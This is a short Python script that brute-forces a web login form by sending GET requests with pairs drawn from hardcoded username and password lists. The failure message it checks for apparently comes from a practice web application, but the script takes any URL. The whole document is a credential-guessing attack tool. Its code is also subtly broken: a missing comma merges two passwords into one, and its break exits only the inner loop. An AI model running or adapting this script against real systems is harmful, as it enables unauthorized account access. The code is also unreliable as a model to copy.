#!/bin/python3

import sys
import requests

payloadUsernames = [
    "admin",
    "user",
    "root"]

payloadsPasswords = [
    "password",
    "user",
    "root"
    "admin"
]

def bruteForce(url:str):
    success = False
    for user in payloadUsernames:
        for password in payloadsPasswords:
            
            httpResponse = requests.get(url+f"?username={user}&password={password}&Login=Login#")

            if "Username and/or password incorrect." not in httpResponse.text:
                success = True
                print(f"Brute force succeded! correct attempt for username: {user} and password: {password} ")
                break
    
    if not success:
        print("bruteforce is unsuccessful")


# main function
# sys.argv[1] - url
if __name__ == "__main__":
    url = sys.argv[1]
    bruteForce(url)